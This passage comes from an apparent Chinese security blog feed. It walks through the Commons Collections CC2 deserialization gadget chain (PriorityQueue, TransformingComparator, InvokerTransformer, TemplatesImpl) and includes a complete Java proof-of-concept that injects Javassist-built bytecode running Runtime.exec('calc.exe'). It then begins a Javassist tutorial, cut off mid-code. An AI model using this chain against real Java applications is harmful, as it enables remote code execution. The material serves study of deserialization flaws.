class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections2.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析下<code>TemplatesImpl</code> 是怎么利用的</p><h3 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h3><p>函数中可以看到有一处newInstance()方法的调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001032573-1255924666.png" alt="image-20220429001031837"></p><p>在对类进行 <code>newInstance()</code> 实例化操作时，会首先执行类中的无参数构造方法或 <code>static&#123;&#125;</code> 静态块中的内容，下面为测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001233443-2003682571.png" alt="image-20220429001232664"></p><p>可以看到_class[]为存放这Class类的数组，如果控制 <code>_class[_transletIndex]</code> 的值，使其指向我们精心构造的的类，那么，在执行<code>newInstance()</code> 实例化恶意类时，就会触发恶意代码执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001353700-1606609752.png" alt="image-20220429001353107"></p><h3 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h3><p>要想执行<code>newInstance()</code>方法，需要满足前面的条件，_name不为空</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001717315-1531884269.png" alt="image-20220429001716751"></p><p>在执行<code>newInstance()</code>方法前会进入 <code>defineTransletClasses()</code> 方法，进入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002213373-1512772555.png" alt="image-20220429002212264"></p><p>在方法中，可以看到在414行代码处，会调用<code>load.defineClass()</code>，学过类加载的知识就知道这里时将 <code>_bytecodes[i]</code> 中的字节码转换成类，并且在下面的if语句中会对转换的类名进行了一个判断，判断父类的类名是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，满足的话就会将索引 <code>i</code> 赋给 <code>_transletIndex</code>，也就是说要想在下面调用newInstance()实例化恶意类，就需要满足我们这个恶意类继承<code>AbstractTranslet</code>。可以知道这里触发的关键在于<code>_bytecodes</code>的赋值，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002817204-1446826639.png" alt="image-20220429002816622"></p><p>这里的思路是通过反射获取 <code>_bytecodes</code>，将恶意类的字节码添加到 <code>_bytecodes</code> 中作为一个元素，然后将字节码转换成类并添加到<code>_class[]</code>中，当调用 <code>TemplatesImpl.getTransletInstance()</code> 方法时，执行<code>_class[_transletIndex].newInstance()</code> 进行恶意类的实例化，从而执行恶意代码。</p><p>现在只需要找到调用<code>getTransletInstance()</code> 方法的地方</p><h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h3><p>在当前类中搜索<code>getTransletInstance()</code>，发现在<code>newTransformer()</code>方法中会调用<code>getTransletInstance()</code> </p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003327280-1495473657.png" alt="image-20220429003326311"></p><p>可以利用<code>InvokerTransformer</code> 类里的可控反射来调用<code>getTransletInstance()</code> 方法，即构造如下利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     InvokerTransformer.transform()</span><br><span class="line">      Method.invoke()</span><br><span class="line">       TemplatesImpl.newTransformer()</span><br><span class="line">        TemplatesImpl.getTransletInstance() -&gt; newInstance()</span><br><span class="line">         Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>构造的poc如下，和ysoserial的poc差不多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTestExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 设置通过 InvokerTransformer.transform() 调用 newTransformer() 方法 */</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformers);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过反射获取 PriorityQueue 对象中的 queue 数组,</span></span><br><span class="line"><span class="comment">         * 并将准备好的 TemplatesImpl 对象添加到这个 queue 数组中,</span></span><br><span class="line"><span class="comment">         * 以保证后续执行 InvokerTransformer.transform() 时成功调用 TemplatesImpl 对象中的 newTransformer() 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003934416-602778476.png" alt="image-20220429003933584"></p><p>调用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429010904215-2047324148.png" alt="image-20220429010903433"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA">https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">https://www.cnblogs.com/nice0e3/p/13860621.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;的&lt;code&gt;readobject&lt;/code&gt;进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Javassist动态编程</title>
    <link href="https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    <id>https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-27T14:19:12.000Z</published>
    <updated>2022-04-27T16:04:36.247Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="动态编程"><a href="#动态编程" class="headerlink" title="动态编程"></a>动态编程</h3><p>动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。</p><span id="more"></span><p>那二者有什么明显的区别呢？简单的说就是在静态编程中，类型检查是在编译时完成的，而动态编程中类型检查是在运行时完成的。所谓动态编程就是绕过编译过程在运行时进行操作的技术，在Java中有如下几种方式：</p><p><strong>反射</strong><br>这个搞Java的应该比较熟悉，原理也就是通过在运行时获得类型信息然后做相应的操作。</p><p><strong>动态编译</strong><br>动态编译是从Java 6开始支持的，主要是通过一个JavaCompiler接口来完成的。通过这种方式我们可以直接编译一个已经存在的java文件，也可以在内存中动态生成Java代码，动态编译执行。</p><p><strong>调用JavaScript引擎</strong><br>Java 6加入了对Script(JSR223)的支持。这是一个脚本框架，提供了让脚本语言来访问Java内部的方法。你可以在运行的时候找到脚本引擎，然后调用这个引擎去执行脚本。这个脚本API允许你为脚本语言提供Java支持。</p><p><strong>动态生成字节码</strong></p><p>这种技术通过操作Java字节码的方式在JVM中生成新类或者对已经加载的类动态添加元素。</p><p>方式：</p><p><strong>ASM</strong>：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p><p><strong>Javassit</strong> ：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。</p><h3 id="什么是Javassist"><a href="#什么是Javassist" class="headerlink" title="什么是Javassist"></a>什么是Javassist</h3><p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库，Java 字节码存储在称为类文件的二进制文件中。每个类文件包含一个 Java 类或接口。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。而个人感觉在安全中最重要的就是在使用<code>Javassist</code>时我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用<code>Javassist</code>的API即可实现字节码编辑，类似于可以达到任意代码执行的效果。</p><h3 id="Javassist的使用"><a href="#Javassist的使用" class="headerlink" title="Javassist的使用"></a>Javassist的使用</h3><p>在<strong>Javassist</strong>中最为重要的是<code>ClassPool</code>，<code>CtClass</code> ，<code>CtMethod</code> 以及 <code>CtField</code>这几个类。</p><p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p><p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p><p>CtMethods：表示类中的方法。</p><p>CtFields ：表示类中的字段。</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassPool<span class="title function_">getDefault</span><span class="params">()</span>返回默认的类池。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>在搜索路径的开头插入目录或jar（或zip）文件。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>ClassPath在搜索路径的开头插入一个对象。</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader<span class="title function_">getClassLoader</span><span class="params">()</span>获取类加载器</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span> 将ClassPath对象附加到搜索路径的末尾。</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  创建一个新的<span class="keyword">public</span>类</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>更改超类，除非此对象表示接口。</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span><br><span class="line">将此类转换为java.lang.Class对象。</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]toBytecode()将该类转换为类文件。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">()</span>将由此CtClass 对象表示的类文件写入当前目录。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span> 将由此CtClass 对象表示的类文件写入本地磁盘。</span><br><span class="line"></span><br><span class="line">CtConstructor<span class="title function_">makeClassInitializer</span><span class="params">()</span>制作一个空的类初始化程序（静态构造函数）。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的开头插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">insertAfter</span><span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的末尾插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span></span><br><span class="line">从另一个方法复制方法体。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(java.lang.String src)</span></span><br><span class="line">设置构造函数主体。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span></span><br><span class="line">从另一个构造函数复制一个构造函数主体。</span><br><span class="line">CtMethod<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span></span><br><span class="line">复制此构造函数并将其转换为方法。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h4><p>CtFields ：表示类中的字段。</p><h4 id="动态生成类"><a href="#动态生成类" class="headerlink" title="动态生成类"></a>动态生成类</h4><p>大致有如下几个步骤</p><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>创建一个自定义类<code>CtClass ctClass = classPool.makeClass();</code></li><li>添加实现接口or属性or构造方法or普通方法</li></ol><ul><li><p>添加接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br></pre></td></tr></table></figure></li><li><p>添加属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line"><span class="comment">//将id设置为public</span></span><br><span class="line">id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line"><span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">ctClass.addField(id);</span><br></pre></td></tr></table></figure></li><li><p>添加构造方法(有参)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加有参构造方法</span></span><br><span class="line"><span 